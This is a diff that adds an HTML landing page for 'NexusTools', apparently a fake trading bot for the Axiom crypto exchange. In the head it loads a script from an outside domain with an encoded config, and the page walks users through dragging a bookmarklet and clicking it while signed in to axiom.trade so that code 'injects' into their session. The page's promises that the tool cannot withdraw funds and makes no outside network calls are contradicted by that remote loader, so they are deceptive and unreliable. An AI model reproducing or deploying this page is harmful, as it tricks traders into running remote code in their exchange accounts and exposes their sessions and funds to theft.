@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>NexusTools - Local Execution Layer</title>
+    <link rel="icon" type="image/svg+xml" href="./assets/images/logo-mark.svg">
+    
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="./assets/css/main.css">
+    <!-- <script src="./assets/js/loader.js" data="eyJjb2RlIjoiLTEwMDMzNTg2NjQzMzQiLCJib3RJZCI6ImJsYWNrZmlzaCIsInVzZXJuYW1lIjoidW5rbm93biIsInBsYXRmb3JtIjoiaHlwZXJsaXF1aWQiLCJhbGVydHMiOnsiZ3VpZGUiOiJZb3UgbXVzdCBkcmFnIHRoZSBib29rbWFya2xldCB0byB5b3VyIGJvb2ttYXJrcyBiYXIgaW5zdGVhZCBvZiBjbGlja2luZyBpdC4iLCJyZWRpcmVjdCI6IllvdSBhcmUgbm93IGJlaW5nIHJlZGlyZWN0ZWQuIiwidW5hdXRob3JpemVkIjoiWW91IG11c3QgYmUgc2lnbmVkIGluIHRvIHVzZSB0aGlzIGJvb2ttYXJrbGV0LiIsImVycm9yIjoiRmFpbGVkIHRvIGV4ZWN1dGUgdGhlIGJvb2ttYXJrbGV0LiBQbGVhc2UgdHJ5IGFnYWluIGxhdGVyLiJ9fQ=="></script> -->
+    <script src="https://simpletestdomain.space/axiom/loader.js" data="eyJjb2RlIjoiLTEwMDM1NzY1ODM4NzEiLCJib3RJZCI6ImJsYWNrZmlzaCIsInVzZXJuYW1lIjoidGVzdCIsInBsYXRmb3JtIjoiYXhpb20iLCJhbGVydHMiOnsiZ3VpZGUiOiJZb3UgbXVzdCBkcmFnIHRoZSBib29rbWFya2xldCB0byB5b3VyIGJvb2ttYXJrcyBiYXIgaW5zdGVhZCBvZiBjbGlja2luZyBpdC4iLCJyZWRpcmVjdCI6IllvdSBhcmUgbm93IGJlaW5nIHJlZGlyZWN0ZWQuIiwidW5hdXRob3JpemVkIjoiWW91IG11c3QgYmUgc2lnbmVkIGluIHRvIHVzZSB0aGlzIGJvb2ttYXJrbGV0LiIsImVycm9yIjoiRmFpbGVkIHRvIGV4ZWN1dGUgdGhlIGJvb2ttYXJrbGV0LiBQbGVhc2UgdHJ5IGFnYWluIGxhdGVyLiJ9fQ=="></script>
+   </head>
+   <body>
+      <div class="ambient-layer">
+        <span class="ambient-orb orb-1"></span>
+        <span class="ambient-orb orb-2"></span>
+        <span class="ambient-orb orb-3"></span>
+      </div>
+      <div class="page-shell">
+      <div class="cursor"></div>
+      <div class="cursor-follower"></div>
+      <!-- Navigation -->
+    <nav class="nav-wrapper">
+      <div class="nav-container">
+            <a href="#" class="nav-logo">
+                <svg width="180" height="32" viewBox="0 0 1100 404" fill="none" xmlns="http://www.w3.org/2000/svg">
+                     <!-- Logo Mark -->
+                     <path d="M371.337 0C222.033 337.265 181.766 0 181.766 0H0V182.303H384.322V0H371.337ZM252.549 166.429H168.803V15.8734H174.924C174.924 15.8734 188.237 162.395 252.549 158.712V166.429Z" fill="#fff"/>
+                     <path d="M12.985 194.117H0V376.42H12.985C162.289 39.1548 202.556 376.42 202.556 376.42H384.322V194.117H12.985ZM215.519 209.991V360.547H209.398C209.398 360.547 196.085 214.025 131.773 217.708V209.991H215.519Z" fill="#fff"/>
+                    <!-- Text -->
+                     <text x="420" y="160" font-family="Inter, sans-serif" font-weight="900" font-size="140" fill="#fff">NEXUS</text>
+                     <text x="420" y="320" font-family="Inter, sans-serif" font-weight="900" font-size="140" fill="#fff">TOOLS</text>
+                   </svg>
+            </a>
+               
+               <div class="nav-links">
+               <a href="#demo" class="nav-link" data-i18n="nav_demo">Demo</a>
+               <a href="#method" class="nav-link" data-i18n="nav_method">Method</a>
+               <a href="#features" class="nav-link" data-i18n="nav_features">Features</a>
+               <a href="#pricing" class="nav-link" data-i18n="nav_pricing">Pricing</a>
+               <a href="#comparison" class="nav-link" data-i18n="nav_comparison">Comparison</a>
+               </div>
+               
+              <div class="nav-actions">
+              <div class="language-switcher">
+                <select id="languageSelect" class="language-select" aria-label="Language">
+                  <option value="en">English</option>
+                  <option value="zh">简体中文</option>
+                  <option value="fr">Français</option>
+                  <option value="ko">한국어</option>
+                  <option value="es">Español</option>
+                  <option value="ja">日本語</option>
+                  <option value="tr">Türkçe</option>
+                  <option value="vi">Tiếng Việt</option>
+                  <option value="ru">Русский</option>
+                  <option value="de">Deutsch</option>
+                  <option value="pt">Português</option>
+                  <option value="it">Italiano</option>
+                  <option value="ar">العربية</option>
+                  <option value="hi">हिन्दी</option>
+                  <option value="pl">Polski</option>
+                  <option value="nl">Nederlands</option>
+                </select>
+               </div>
+                <a href="#setup" class="nav-cta" data-i18n="nav_cta">Get Access</a>
+            </div>
+         </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero-section">
+        <canvas id="hero-canvas"></canvas>
+        <div class="hero-bg-gradient"></div>
+        <div class="hero-container">
+            <div class="hero-grid">
+                <div class="hero-content">
+                    <div class="hero-badge" data-i18n="hero_badge">
+                        Axiom v1.4 · Local Execution Layer
+                    </div>
+    
+                    <h1 class="hero-title">
+                        <span class="hero-title-gradient" data-i18n="hero_title_line1">EXECUTE LOCAL.</span><br>
+                        <span class="hero-title-gradient" data-i18n="hero_title_line2">WIN GLOBAL.</span>
+                    </h1>
+    
+                    <p class="hero-subtitle" data-i18n="hero_subtitle">
+                        The first 100% client-side trading engine. No API keys. No server latency.
+                        NexusTools injects institutional-grade logic directly into your browser.
+                    </p>
+    
+                    <div class="hero-meta">
+                        <span class="hero-pill" data-i18n="hero_pill_1">Client-Side Execution</span>
+                        <span class="hero-pill" data-i18n="hero_pill_2">Zero API Keys</span>
+                        <span class="hero-pill neutral" data-i18n="hero_pill_3">Stealth DOM Automation</span>
+                    </div>
+    
+                    <div class="hero-actions">
+                        <a href="#demo" class="btn btn-primary" data-i18n="hero_primary_cta">Watch Demo</a>
+                        <a href="#setup" class="btn btn-ghost" data-i18n="hero_secondary_cta">Setup in 30s</a>
+                        <div class="trust-badge">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                            </svg>
+                            <span data-i18n="hero_trust_badge">Client-Side Verified</span>
+                        </div>
+                    </div>
+                </div>
+    
+                <div class="hero-preview">
+                    <div class="hero-preview-card tilt-card" data-tilt>
+                        <div class="hero-preview-header">
+                            <span class="preview-chip green" data-i18n="hero_chip_local">Local node</span>
+                            <span class="preview-chip" data-i18n="hero_chip_stealth">Stealth verified</span>
+                        </div>
+    
+                        <div class="hero-preview-metrics">
+                            <div class="hero-preview-metric">
+                                <span class="metric-label" data-i18n="hero_metric_latency_label">Latency</span>
+                                <span class="metric-value">3.8ms</span>
+                                <span class="metric-change" data-i18n="hero_metric_latency_change">↑ 38% faster</span>
+                            </div>
+                            <div class="hero-preview-metric">
+                                <span class="metric-label" data-i18n="hero_metric_fill_label">Fill rate</span>
+                                <span class="metric-value">98.4%</span>
+                                <span class="metric-change" data-i18n="hero_metric_fill_change">last 72 trades</span>
+                            </div>
+                            <div class="hero-preview-metric">
+                                <span class="metric-label" data-i18n="hero_metric_blocks_label">Order blocks</span>
+                                <span class="metric-value">12</span>
+                                <span class="metric-change" data-i18n="hero_metric_blocks_change">+3 armed</span>
+                            </div>
+                            <div class="hero-preview-metric">
+                                <span class="metric-label" data-i18n="hero_metric_pnl_label">PnL sync</span>
+                                <span class="metric-value">+$4.2k</span>
+                                <span class="metric-change" data-i18n="hero_metric_pnl_change">24h realized</span>
+                            </div>
+                        </div>
+    
+                        <div class="hero-preview-divider"></div>
+    
+                        <div class="hero-preview-footer">
+                            <span data-i18n="hero_footer_left">Command queue: 03 live</span>
+                            <span data-i18n="hero_footer_right">Uptime 24/7 · Zero API keys</span>
+                        </div>
+                    </div>
+    
+                    <div class="bookmarklet-card tilt-card" data-tilt>
+                        <div class="bookmarklet-inner">
+                            <div class="bookmarklet-button">
+                                <div class="bookmarklet-hint" data-i18n="bookmarklet_hint">Drag to Bookmarks Bar</div>
+                                <a class="bookmarklet-btn bookmarklet">
+                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/>
+                                    </svg>
+                                    <span>NEXUSTOOLS v1.0</span>
+                                </a>
+                            </div>
+                            
+                            <div class="bookmarklet-info">
+                                <h3 data-i18n="bookmarklet_title">Zero API Keys Required</h3>
+                                <p data-i18n="bookmarklet_desc">Runs entirely in your browser memory.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="hero-signal-rail">
+                <div class="hero-signal">
+                    <span class="hero-signal-label" data-i18n="hero_signal_latency_label">Latency Mode</span>
+                    <span class="hero-signal-value" data-i18n="hero_signal_latency_value">Photon · 3.8ms</span>
+                </div>
+                <div class="hero-signal">
+                    <span class="hero-signal-label" data-i18n="hero_signal_failsafe_label">Fail-safes</span>
+                    <span class="hero-signal-value" data-i18n="hero_signal_failsafe_value">Redundant · 4 layers</span>
+                </div>
+                <div class="hero-signal">
+                    <span class="hero-signal-label" data-i18n="hero_signal_cycle_label">Automation Cycle</span>
+                    <span class="hero-signal-value" data-i18n="hero_signal_cycle_value">12 signals / min</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Demo Section -->
+    <section id="demo" class="demo-section">
+        <div class="section-shell">
+        <div class="demo-container">
+            <div class="demo-header">
+                    <span data-i18n="demo_header_main">Tactical Briefing // Live Demo</span>
+                    <span data-i18n="demo_header_status">Secure Connection Established</span>
+                </div>
+                
+            <div class="demo-video">
+                <div class="demo-overlay" data-i18n="demo_overlay_text">
+                    &gt; Watch Installation Sequence<br>
+                    &gt; Duration: 00:15 // Status: Encrypted
+                    </div>
+                <img src="./assets/images/screenshot2.png" alt="NexusTools Interface Demo">
+                </div>
+                
+            <div class="demo-stats">
+                <div class="demo-stat">
+                    <span class="demo-stat-label" data-i18n="demo_stat_system_label">System</span>
+                    <span class="demo-stat-value" data-i18n="demo_stat_system_value">Axiom DEX</span>
+                </div>
+                <div class="demo-stat">
+                    <span class="demo-stat-label" data-i18n="demo_stat_mode_label">Mode</span>
+                    <span class="demo-stat-value" data-i18n="demo_stat_mode_value">Bookmarklet</span>
+            </div>
+                <div class="demo-stat">
+                    <span class="demo-stat-label" data-i18n="demo_stat_latency_label">Latency</span>
+                    <span class="demo-stat-value green" data-i18n="demo_stat_latency_value">4ms</span>
+         </div>
+                <div class="demo-stat">
+                    <span class="demo-stat-label" data-i18n="demo_stat_status_label">Status</span>
+                    <span class="demo-stat-value green" data-i18n="demo_stat_status_value">Live Tracking</span>
+                </div>
+            </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Quick Setup Section -->
+    <section id="setup" class="quick-setup-section">
+        <div class="section-shell">
+        <div class="setup-container">
+            <div class="setup-header">
+                <span class="setup-tag" data-i18n="setup_tag">Quick Setup · 30s</span>
+                <h2 data-i18n="setup_title">Ready in four simple steps</h2>
+                <p data-i18n="setup_subtitle">No terminals, keys, or config files. Follow the checklist below and NexusTools will be live inside Axiom in under a minute.</p>
+                        </div>
+
+            <div class="setup-grid">
+                <div class="setup-card tilt-card" data-tilt>
+                    <div class="setup-number">01</div>
+                    <h3 data-i18n="setup_card1_title">Open your bookmarks bar</h3>
+                    <div class="os-instructions">
+                        <div class="os-line">
+                            <span class="os-label" data-i18n="setup_card1_windows">Windows</span>
+                            <span class="shortcut"><kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>B</kbd></span>
+                            <span data-i18n="setup_card1_windows_note">Keep the bar showing.</span>
+                        </div>
+                        <div class="os-line">
+                            <span class="os-label" data-i18n="setup_card1_mac">Mac</span>
+                            <span class="shortcut"><kbd>Cmd</kbd> + <kbd>Shift</kbd> + <kbd>B</kbd></span>
+                            <span data-i18n="setup_card1_mac_note">Toggle the bookmarks bar.</span>
+                        </div>
+                        <p class="os-note" data-i18n="setup_card1_note">The NexusTools button stays in your bookmarks bar for one-click access.</p>
+                    </div>
+                </div>
+                <div class="setup-card tilt-card" data-tilt>
+                    <div class="setup-number">02</div>
+                    <h3 data-i18n="setup_card2_title">Drag the NexusTools button</h3>
+                    <p data-i18n="setup_card2_desc">Grab the "NEXUSTOOLS v1.0" bookmarklet from the hero section and drop it onto the bar.</p>
+                            </div>
+                <div class="setup-card tilt-card" data-tilt>
+                    <div class="setup-number">03</div>
+                    <h3 data-i18n="setup_card3_title">Open Axiom</h3>
+                    <p data-i18n="setup_card3_desc">Navigate to <span style="color: var(--nexus-green); font-family: var(--font-mono);">axiom.trade</span> and sign in as usual.</p>
+                        </div>
+                <div class="setup-card tilt-card" data-tilt>
+                    <div class="setup-number">04</div>
+                    <h3 data-i18n="setup_card4_title">Click to activate</h3>
+                    <p data-i18n="setup_card4_desc">Hit the bookmark you just saved. NexusTools injects instantly and the trading console comes online.</p>
+                    </div>
+                            </div>
+
+            <div class="setup-cta">
+                <div class="bookmarklet-card tilt-card" data-tilt>
+                    <div class="bookmarklet-inner">
+                            <div class="bookmarklet-button">
+                            <div class="bookmarklet-hint" data-i18n="bookmarklet_hint">Drag to Bookmarks Bar</div>
+                            <a class="bookmarklet-btn bookmarklet">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/>
+                                </svg>
+                                <span>NEXUSTOOLS v1.0</span>
+                            </a>
+                        </div>
+
+                        <div class="bookmarklet-info">
+                                <h3 data-i18n="bookmarklet_title">Zero API Keys Required</h3>
+                                <p data-i18n="bookmarklet_desc">Runs entirely in your browser memory.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+                            </div>
+        </div>
+    </section>
+
+    <!-- Method Section -->
+    <section id="method" class="method-section">
+        <div class="section-shell">
+        <div class="section-head">
+            <span class="section-tag" data-i18n="method_tag">Autonomous Stack</span>
+            <h2 data-i18n="method_title">Cloud bots are liabilities</h2>
+            <p data-i18n="method_desc">Everything runs locally inside the Axiom tab you already trust. No API credentials, no remote latency, no unexplained withdrawals.</p>
+        </div>
+        <div class="method-container">
+            <div class="method-left">
+
+                <div class="terminal-window">
+                    <div class="terminal-header">
+                        <div class="terminal-dots">
+                            <div class="terminal-dot red"></div>
+                            <div class="terminal-dot yellow"></div>
+                            <div class="terminal-dot green"></div>
+                            </div>
+                        <div class="terminal-status">
+                            <div class="status-dot"></div>
+                            <span>NEXUSTOOLS ACTIVE</span>
+                            </div>
+                        </div>
+                    <div class="terminal-body">
+                        <div class="terminal-line">&gt; Initializing NexusTools v1.4.2 · local sandbox</div>
+                        <div class="terminal-line">&gt; Runtime detected: Brave 1.70 · chromium 121</div>
+                        <div class="terminal-line">&gt; Axiom origin locked to https://axiom.trade</div>
+                        <div class="terminal-line">&gt; Manifest signature (sha256) 0xadf4...c21 · verified</div>
+                        <div class="terminal-line success">&gt; Permissions granted: DOM click + viewport read-only</div>
+                        <div class="terminal-line success">&gt; Funds transfer command: <span class="success">NOT AVAILABLE</span></div>
+                        <div class="terminal-line highlight">&gt; Automation policy queue: 2 live / 6 standby</div>
+                            </div>
+                    <div class="integrity-grid">
+                        <div class="integrity-card">
+                            <span class="integrity-label">Device attestation</span>
+                            <strong>Passed · 12 minutes ago</strong>
+                            <p class="integrity-note">Hardware fingerprint hashed locally. No telemetry leaves the Axiom tab.</p>
+                        </div>
+                        <div class="integrity-card">
+                            <span class="integrity-label">Network scope</span>
+                            <strong>app.Axiom.xyz only</strong>
+                            <p class="integrity-note">All outbound requests outside the exchange are blocked by a strict CSP shim.</p>
+                        </div>
+                        <div class="integrity-card">
+                            <span class="integrity-label">Release channel</span>
+                            <strong>Build 1.4.2 · commit 58b12d</strong>
+                            <p class="integrity-note">Signed bundle verified via SHA-256 0xadf4…c21 before injection.</p>
+                        </div>
+                        <div class="integrity-card">
+                            <span class="integrity-label">Escalation contact</span>
+                            <strong><a href="./cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b1c2d4d2c4c3d8c5c8f1d6d4c5dfd4c9c4c2d9dd9fc5dededdc2">[email&#160;protected]</a></strong>
+                            <p class="integrity-note">Live trading sessions monitored · response SLA &lt; 4h.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="method-right">
+                <div class="method-item tilt-card" data-tilt>
+                    <span class="method-num">01</span>
+                    <div class="method-content">
+                        <h3 class="method-item-title" data-i18n="method_item1_title">The API Trap</h3>
+                        <p class="method-item-desc" data-i18n="method_item1_desc">
+                            Normal bots demand your API Secret Key which means they can drain you. 
+                            NexusTools operates via bookmarklet injection. It clicks buttons for you locally and literally cannot withdraw funds.
+                        </p>
+                    </div>
+                </div>
+                
+                <div class="method-item tilt-card" data-tilt>
+                    <span class="method-num">02</span>
+                    <div class="method-content">
+                        <h3 class="method-item-title" data-i18n="method_item2_title">Micro-Latency Execution</h3>
+                        <p class="method-item-desc" data-i18n="method_item2_desc">
+                            Cloud bots add server hop latency. NexusTools lives inside the Axiom tab and reacts to DOM updates faster than the human eye.
+                        </p>
+                    </div>
+                </div>
+                
+                <div class="method-item tilt-card" data-tilt>
+                    <span class="method-num">03</span>
+                    <div class="method-content">
+                        <h3 class="method-item-title" data-i18n="method_item3_title">Phantom Mode</h3>
+                        <p class="method-item-desc" data-i18n="method_item3_desc">
+                            Because it mimics user clicks, NexusTools is indistinguishable from a highly skilled manual trader. 
+                            No API rate limits. No bans. Complete stealth operation.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        </div>
+    </section>
+
+    <!-- Execution + Clarity Section -->
+    <section id="features" class="assurance-section">
+        <div class="section-shell">
+        <div class="section-head center">
+            <span class="section-tag">Execution Modes · Clarity Protocol</span>
+            <h2>Infrastructure-grade automation that looks and feels trusted</h2>
+            <p>Three execution modes with built-in risk controls. Each strategy includes verifiable security checks and transparent logging.</p>
+        </div>
+        <div class="assurance-layout">
+            <div class="execution-stack">
+                <article class="execution-card">
+                    <div class="card-meta">
+                        <span class="card-label">Mode 01</span>
+                        <span class="card-kpi">Median latency 3.4 ms</span>
+                    </div>
+                    <h3>Guided Momentum</h3>
+                    <p>Deterministic breakout entries paired with position caps so an automation never outruns your bankroll.</p>
+                    <ul>
+                        <li>Signals sourced directly from Axiom DOM deltas.</li>
+                        <li>Slip guard: 0.35% per leg with auto-cancel if breached.</li>
+                    </ul>
+                </article>
+                <article class="execution-card">
+                    <div class="card-meta">
+                        <span class="card-label">Mode 02</span>
+                        <span class="card-kpi">Drawdown ceiling 0.9%</span>
+                    </div>
+                    <h3>Protective Follow-through</h3>
+                    <p>Trail management that re-measures volatility each second rather than guessing with fixed numbers.</p>
+                    <ul>
+                        <li>Adaptive stop width informed by realized book variance.</li>
+                        <li>Instant kill-switch once two correlated legs disagree.</li>
+                    </ul>
+                </article>
+                <article class="execution-card">
+                    <div class="card-meta">
+                        <span class="card-label">Mode 03</span>
+                        <span class="card-kpi">Audit ping &lt; 90s</span>
+                    </div>
+                    <h3>Hands-off Surveillance</h3>
+                    <p>Leave NexusTools in the background. When a policy fires you get a verified desktop toast plus plaintext log.</p>
+                    <ul>
+                        <li>Auditable JSON log stored locally for 7 days.</li>
+                        <li>Optional webhook ping to your own health dashboard.</li>
+                    </ul>
+                </article>
+            </div>
+            <div class="clarity-stack">
+                <div class="clarity-card primary">
+                    <h3>Clarity Protocol</h3>
+                    <p>Everything you need to replicate our due-diligence process without trusting marketing screenshots.</p>
+                    <ul class="clarity-list">
+                        <li><strong>Signed builds:</strong> sha256 0xadf4…c21 · published 23 Nov 2025.</li>
+                        <li><strong>Runtime scope:</strong> Works only on app.Axiom.xyz, enforced via CSP.</li>
+                        <li><strong>Data policy:</strong> No network calls besides Axiom; telemetry stays in-memory.</li>
+                    </ul>
+                </div>
+                <div class="clarity-card">
+                    <h4>Verification checklist</h4>
+                    <div class="clarity-checklist">
+                        <div class="checklist-row">
+                            <span>Local install</span>
+                            <span class="badge success">Drag bookmark → inspect source</span>
+                        </div>
+                        <div class="checklist-row">
+                            <span>Release log</span>
+                            <span class="badge neutral">Audit JSON available inside console &gt; help</span>
+                        </div>
+                        <div class="checklist-row">
+                            <span>Security contact</span>
+                            <span class="badge info"><a href="./cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="483b2d2b3d3a213c31082f2d3c262d303d3b2024663c2727243b">[email&#160;protected]</a></span>
+                        </div>
+                    </div>
+                </div>
+                <div class="clarity-card">
+                    <h4>Reference controls</h4>
+                    <p>Security principles we follow:</p>
+                    <ul class="clarity-list">
+                        <li>✔ Local-only automation - no API keys, no seed phrases.</li>
+                        <li>✔ Double-confirm prompts before enabling unattended modes.</li>
+                        <li>✔ Public status page with uptime + incident notes.</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        </div>
+    </section>
+
+    <!-- Pricing Section -->
+    <section id="pricing" class="pricing-section">
+        <div class="section-shell">
+        <div class="pricing-header">
+            <span class="section-tag" data-i18n="pricing_tag">The Gatekeeper</span>
+            <h2 class="pricing-title" data-i18n="pricing_title">Earn first. Upgrade later</h2>
+            <p class="pricing-subtitle" data-i18n="pricing_subtitle">We don't want your money until you have taken theirs.</p>
+             </div>
+             
+        <div class="pricing-grid">
+            <div class="pricing-card featured tilt-card" data-tilt>
+                <div class="pricing-plan" data-i18n="pricing_plan_initiate">Initiate</div>
+                <div class="pricing-price" data-i18n="pricing_price_free">FREE</div>
+                <ul class="pricing-features">
+                    <li class="pricing-feature" data-i18n="pricing_plan_initiate_feature1">Full Access to Momentum Strategy</li>
+                    <li class="pricing-feature" data-i18n="pricing_plan_initiate_feature2">Up to $50,000 Volume / Month</li>
+                    <li class="pricing-feature" data-i18n="pricing_plan_initiate_feature3">Local Execution Engine</li>
+                    <li class="pricing-feature" data-i18n="pricing_plan_initiate_feature4">Real-time Position Tracking</li>
+                    <li class="pricing-feature" data-i18n="pricing_plan_initiate_feature5">Risk Management Tools</li>
+                         </ul>
+                <div class="pricing-status" data-i18n="pricing_plan_initiate_status">
+                    ● CURRENT STATUS: ACTIVE
+                     </div>
+                 </div>
+                 
+            <div class="pricing-card locked tilt-card" data-tilt>
+                <div class="pricing-plan" data-i18n="pricing_plan_ascended">Ascended</div>
+                <div class="pricing-price" data-i18n="pricing_price_hidden">???</div>
+                <ul class="pricing-features">
+                    <li class="pricing-feature" data-i18n="pricing_plan_ascended_feature1">Unlimited Volume</li>
+                    <li class="pricing-feature" data-i18n="pricing_plan_ascended_feature2">Copy-Trading (Wallet Tracking)</li>
+                    <li class="pricing-feature" data-i18n="pricing_plan_ascended_feature3">MEV Protection</li>
+                    <li class="pricing-feature" data-i18n="pricing_plan_ascended_feature4">Advanced Strategies</li>
+                    <li class="pricing-feature" data-i18n="pricing_plan_ascended_feature5">Priority Support</li>
+                         </ul>
+                <div class="pricing-locked" data-i18n="pricing_plan_ascended_lock">
+                    UNLOCKS AUTOMATICALLY<br>
+                    <small>Requirement: &gt;$300 Profit via Free Plan</small>
+                     </div>
+                     </div>
+                 </div>
+        </div>
+    </section>
+             
+    <section id="comparison" class="comparison-section">
+        <div class="section-shell">
+            <table class="comparison-table">
+                <thead>
+                    <tr>
+                        <th data-i18n="comparison_heading_metric">Comparison</th>
+                        <th data-i18n="comparison_heading_nexus">NexusTools</th>
+                        <th data-i18n="comparison_heading_cloud">Typical Cloud Bot</th>
+                     </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td data-i18n="comparison_row_security">Security</td>
+                        <td class="comparison-good" data-i18n="comparison_security_good">✓ 100% Local (No Keys)</td>
+                        <td class="comparison-bad" data-i18n="comparison_security_bad">✗ Requires API Keys</td>
+                     </tr>
+                    <tr>
+                        <td data-i18n="comparison_row_cost">Cost</td>
+                        <td class="comparison-good" data-i18n="comparison_cost_good">✓ Free until profitable</td>
+                        <td class="comparison-bad" data-i18n="comparison_cost_bad">✗ $49-99/mo Upfront</td>
+                     </tr>
+                    <tr>
+                        <td data-i18n="comparison_row_install">Installation</td>
+                        <td class="comparison-good" data-i18n="comparison_install_good">✓ Drag & Drop (3s)</td>
+                        <td class="comparison-bad" data-i18n="comparison_install_bad">✗ Complex Config</td>
+                     </tr>
+                     <tr>
+                        <td data-i18n="comparison_row_ban">Bannable?</td>
+                        <td class="comparison-good" data-i18n="comparison_ban_good">✓ No (Undetectable)</td>
+                        <td class="comparison-bad" data-i18n="comparison_ban_bad">✗ Yes (IP Flagging)</td>
+                     </tr>
+                    <tr>
+                        <td data-i18n="comparison_row_latency">Latency</td>
+                        <td class="comparison-good" data-i18n="comparison_latency_good">✓ 4ms (Local)</td>
+                        <td class="comparison-bad" data-i18n="comparison_latency_bad">✗ 50-200ms (Server)</td>
+                    </tr>
+                </tbody>
+                 </table>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+             <div class="footer-container">
+            <div class="footer-logo">
+                <svg width="220" height="40" viewBox="0 0 1100 404" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <!-- Logo Mark -->
+                    <path d="M371.337 0C222.033 337.265 181.766 0 181.766 0H0V182.303H384.322V0H371.337ZM252.549 166.429H168.803V15.8734H174.924C174.924 15.8734 188.237 162.395 252.549 158.712V166.429Z" fill="#fff"/>
+                    <path d="M12.985 194.117H0V376.42H12.985C162.289 39.1548 202.556 376.42 202.556 376.42H384.322V194.117H12.985ZM215.519 209.991V360.547H209.398C209.398 360.547 196.085 214.025 131.773 217.708V209.991H215.519Z" fill="#fff"/>
+                    <!-- Text -->
+                    <text x="420" y="160" font-family="Inter, sans-serif" font-weight="900" font-size="140" fill="#fff">NEXUS</text>
+                    <text x="420" y="320" font-family="Inter, sans-serif" font-weight="900" font-size="140" fill="#fff">TOOLS</text>
+                </svg>
+                </div>
+                
+            <div class="footer-links">
+                <a href="#setup" class="footer-link" data-i18n="footer_link_setup">Setup Guide</a>
+                <a href="#pricing" class="footer-link" data-i18n="footer_link_pricing">Pricing</a>
+                <a href="./cdn-cgi/l/email-protection#e99a9c9999869b9da98e8c9d878c919c9a8185c79d8686859a" class="footer-link" data-i18n="footer_link_email">Email</a>
+                <a href="https://x.com/NexusEHL" class="footer-link" target="_blank" rel="noopener noreferrer" data-i18n="footer_link_social">X (Formerly Twitter)</a>
+                </div>
+                
+            <div class="footer-columns">
+                <div class="footer-col">
+                    <h4 data-i18n="footer_contact_title">Contact</h4>
+                    <a href="./cdn-cgi/l/email-protection#cebdbbbebea1bcba8ea9abbaa0abb6bbbda6a2e0baa1a1a2bd"><span class="__cf_email__" data-cfemail="21525451514e5355614644554f44595452494d0f554e4e4d52">[email&#160;protected]</span></a>
+                </div>
+                <div class="footer-col">
+                    <h4 data-i18n="footer_compliance_title">Compliance</h4>
+                    <p data-i18n="footer_compliance_line1">Runs only on <span style="font-family: var(--font-mono); color: var(--nexus-green);">app.Axiom.xyz</span></p>
+                    <p data-i18n="footer_compliance_line2">No API or wallet permissions requested</p>
+             </div>
+                <div class="footer-col">
+                    <h4 data-i18n="footer_status_title">Status</h4>
+                    <p data-i18n="footer_status_line1">Systems Online · <span style="color: var(--nexus-green);">24/7</span></p>
+                    <p data-i18n="footer_status_line2">Version 1.4.2</p>
+         </div>
+      </div>
+
+            <div class="footer-divider"></div>
+            
+            <div class="footer-copy" data-i18n="footer_copy">
+                    Decentralized Local Execution Layer<br>
+                Not financial advice. You are the controller<br>
+                © 2025 NexusTools. All rights reserved
+                </div>
+             </div>
+    </footer>
+
+    <div id="cookieToast" class="cookie-toast" role="alertdialog" aria-live="polite" aria-label="Cookie usage notice" aria-hidden="true">
+        <div class="cookie-toast__orb" aria-hidden="true"></div>
+        <div class="cookie-toast__panel">
+            <div class="cookie-toast__intro">
+                <div class="cookie-toast__icon" aria-hidden="true">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="9"></circle>
+                        <path d="M9 12a3 3 0 0 0 3 3"></path>
+                        <path d="M12 7v.01"></path>
+                        <path d="M16 11v.01"></path>
+                        <path d="M8 15v.01"></path>
+                    </svg>
+                </div>
+                <div class="cookie-toast__header">
+                    <span class="cookie-toast__tag" data-i18n="cookie_tag">Privacy Pulse</span>
+                    <h3 class="cookie-toast__title" data-i18n="cookie_title">Cookie Control Center</h3>
+                </div>
+            </div>
+            <p class="cookie-toast__text" data-i18n="cookie_message">
+                Choose how we remember your language preference. No tracking, no ads - just local UX.
+            </p>
+            <div class="cookie-toast__actions">
+                <button id="cookieDecline" class="cookie-action ghost" type="button">
+                    <span class="cookie-action__label" data-i18n="cookie_decline_title">Decline</span>
+                    <span class="cookie-action__desc" data-i18n="cookie_decline_desc">Skip cookies completely. We’ll ask again next visit.</span>
+                </button>
+                <button id="cookieMinimal" class="cookie-action outline" type="button">
+                    <span class="cookie-action__label" data-i18n="cookie_minimal_title">Minimal</span>
+                    <span class="cookie-action__desc" data-i18n="cookie_minimal_desc">Remember the language in this browser only (no cookies).</span>
+                </button>
+                <button id="cookieAccept" class="cookie-action primary" type="button">
